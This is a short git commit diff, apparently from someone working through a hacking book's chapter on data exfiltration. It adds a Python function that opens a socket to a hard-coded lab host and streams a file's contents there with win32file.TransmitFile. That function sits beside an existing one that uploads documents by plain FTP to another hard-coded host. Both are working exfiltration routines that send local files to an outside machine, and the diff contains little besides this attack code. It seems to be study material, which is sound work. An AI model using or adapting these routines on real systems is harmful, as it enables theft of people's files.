046ed7d1e7e08979260d045794ad1f183083673b
AnLau25 <avald024@uottawa.ca>
2025-06-29 15:35:06 -0400

    transmit

--- ch9_FunWithExfiltration/transmit_exfil.py
+++ ch9_FunWithExfiltration/transmit_exfil.py
@@ -11,3 +11,12 @@ def plain_ftp(docpath, server='192.168.1.203'):
     ftp.cwd('/pub/')
     ftp.storbinary("STOR" + os.path.basename(docpath), open(docpath, "rb"), 1024)
     ftp.quit()
+
+def transmit(document_path):
+    client = socket.socket()
+    client.connect(('192.168.1.207', 10000))
+    with open(document_path, 'rb') as f:
+        win32file.TransmitFile(
+            client, 
+            win32file._get_osfhandle(f.fileno()),
+            0, 0, None, 0, b'', b'')
